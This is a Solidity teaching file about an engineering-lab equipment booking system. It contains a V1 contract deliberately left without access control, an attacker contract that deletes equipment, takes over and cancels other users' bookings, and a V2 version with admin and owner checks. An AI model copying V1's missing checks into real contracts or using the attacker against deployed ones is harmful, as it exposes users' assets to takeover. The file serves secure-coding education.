// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  ENGINEERING LABORATORY – SMART CONTRACT LAB
 *
 *  This one file contains:
 *
 *  1) EngineeringLaboratoryV1       – vulnerable laboratory asset booking system
 *  2) EngineeringLaboratoryAttacker – attacker exploiting the missing ownership checks
 *  3) EngineeringLaboratoryV2Defense – secure version with access control & reservations
 *
 *  Concept:
 *    - Engineering Laboratory contains equipment (microscopes, robots, sensors, 3D printers).
 *    - Users can "book" equipment.
 *    - V1 BUG: no access control — anyone can delete equipment, overwrite owners,
 *              force reservations, or cancel other users’ bookings.
 *    - Attacker abuses this.
 *    - V2 FIX: equipmentOwner + labAdmin + safe booking logic.
 */


// =============================================================
//                1. VULNERABLE ENGINEERING LAB V1
// =============================================================
contract EngineeringLaboratoryV1 {

    struct Equipment {
        string name;
        bool exists;
        address currentUser; // who is using it now
        uint64 createdAt;
        uint64 updatedAt;
    }

    // equipmentId (uint256) -> Equipment
    mapping(uint256 => Equipment) public equipment;

    event EquipmentAdded(uint256 indexed id, string name);
    event EquipmentRemoved(uint256 indexed id);
    event EquipmentBooked(uint256 indexed id, address indexed user);
    event BookingCanceled(uint256 indexed id, address indexed user);

    /*
     *  ⚠️ VULNERABILITY:
     *  Anyone can add, remove, book, or cancel for ANY equipment.
     *  No access control → full lab takeover possible.
     */

    function addEquipment(uint256 id, string memory name) external {
        Equipment storage e = equipment[id];
        e.name = name;
        e.exists = true;
        e.createdAt = uint64(block.timestamp);
        e.updatedAt = uint64(block.timestamp);

        emit EquipmentAdded(id, name);
    }

    function removeEquipment(uint256 id) external {
        require(equipment[id].exists, "not found");
        delete equipment[id];
        emit EquipmentRemoved(id);
    }

    function bookEquipment(uint256 id) external {
        Equipment storage e = equipment[id];
        require(e.exists, "not found");
        e.currentUser = msg.sender;
        e.updatedAt = uint64(block.timestamp);
        emit EquipmentBooked(id, msg.sender);
    }

    function cancelBooking(uint256 id) external {
        Equipment storage e = equipment[id];
        require(e.exists, "not found");
        // even if not the current user, cancels anyway (another bug)
        address previous = e.currentUser;
        e.currentUser = address(0);
        e.updatedAt = uint64(block.timestamp);

        emit BookingCanceled(id, previous);
    }
}



// =============================================================
//                     2. ATTACKER CONTRACT
// =============================================================
contract EngineeringLaboratoryAttacker {

    EngineeringLaboratoryV1 public target;
    address public attacker;

    event EquipmentHijacked(uint256 indexed id, string action);
    event BookingStolen(uint256 indexed id, address indexed newHolder);

    constructor(address _lab) {
        target = EngineeringLaboratoryV1(_lab);
        attacker = msg.sender;
    }

    // attacker removes victim's equipment
    function deleteEquipment(uint256 id) external {
        require(msg.sender == attacker, "not attacker");
        target.removeEquipment(id);
        emit EquipmentHijacked(id, "deleted");
    }

    // attacker steals booking from victim
    function stealBooking(uint256 id) external {
        require(msg.sender == attacker, "not attacker");
        target.bookEquipment(id);
        emit BookingStolen(id, attacker);
    }

    // attacker cancels victim booking
    function cancelVictim(uint256 id) external {
        require(msg.sender == attacker, "not attacker");
        target.cancelBooking(id);
        emit EquipmentHijacked(id, "booking canceled");
    }
}



// =============================================================
//          3. SECURE ENGINEERING LABORATORY V2 DEFENSE
// =============================================================
contract EngineeringLaboratoryV2Defense {

    // ADMIN + OWNERSHIP LAYER
    address public labAdmin;

    struct Equipment {
        string name;
        bool exists;
        address equipmentOwner;  // who manages this equipment
        address currentUser;     // booking
        bool reserved;           // reservation flag
        uint64 createdAt;
        uint64 updatedAt;
    }

    mapping(uint256 => Equipment) public equipment;

    event EquipmentAdded(uint256 indexed id, string name, address owner);
    event EquipmentRemoved(uint256 indexed id);
    event EquipmentBooked(uint256 indexed id, address indexed user);
    event BookingCanceled(uint256 indexed id, address indexed user);
    event EquipmentOwnerChanged(uint256 indexed id, address indexed newOwner);

    modifier onlyAdmin() {
        require(msg.sender == labAdmin, "not admin");
        _;
    }

    modifier onlyOwner(uint256 id) {
        require(equipment[id].equipmentOwner == msg.sender, "not owner");
        _;
    }

    constructor() {
        labAdmin = msg.sender;
    }

    function transferAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "zero");
        labAdmin = newAdmin;
    }

    // ---------------- EQUIPMENT MANAGEMENT --------------------

    function addEquipment(uint256 id, string memory name, address owner)
        external
        onlyAdmin
    {
        require(owner != address(0), "invalid owner");
        Equipment storage e = equipment[id];

        e.name = name;
        e.exists = true;
        e.equipmentOwner = owner;
        e.createdAt = uint64(block.timestamp);
        e.updatedAt = uint64(block.timestamp);

        emit EquipmentAdded(id, name, owner);
    }

    function removeEquipment(uint256 id)
        external
        onlyOwner(id)
    {
        require(equipment[id].exists, "not found");
        delete equipment[id];
        emit EquipmentRemoved(id);
    }

    function changeEquipmentOwner(uint256 id, address newOwner)
        external
        onlyAdmin
    {
        require(equipment[id].exists, "not found");
        require(newOwner != address(0), "zero");

        equipment[id].equipmentOwner = newOwner;
        equipment[id].updatedAt = uint64(block.timestamp);

        emit EquipmentOwnerChanged(id, newOwner);
    }

    // ---------------- BOOKING SYSTEM (SECURE) -----------------

    function bookEquipment(uint256 id) external {
        Equipment storage e = equipment[id];
        require(e.exists, "not found");
        require(!e.reserved, "already booked");

        e.currentUser = msg.sender;
        e.reserved = true;
        e.updatedAt = uint64(block.timestamp);

        emit EquipmentBooked(id, msg.sender);
    }

    function cancelBooking(uint256 id) external {
        Equipment storage e = equipment[id];
        require(e.exists, "not found");
        require(e.reserved, "not reserved");
        require(
            msg.sender == e.currentUser ||
            msg.sender == e.equipmentOwner ||
            msg.sender == labAdmin,
            "no permission"
        );

        address prev = e.currentUser;
        e.currentUser = address(0);
        e.reserved = false;
        e.updatedAt = uint64(block.timestamp);

        emit BookingCanceled(id, prev);
    }

    function getEquipment(uint256 id)
        external
        view
        returns (
            string memory name,
            address owner,
            address currentUser,
            bool reserved,
            bool exists
        )
    {
        Equipment storage e = equipment[id];
        return (e.name, e.equipmentOwner, e.currentUser, e.reserved, e.exists);
    }
}
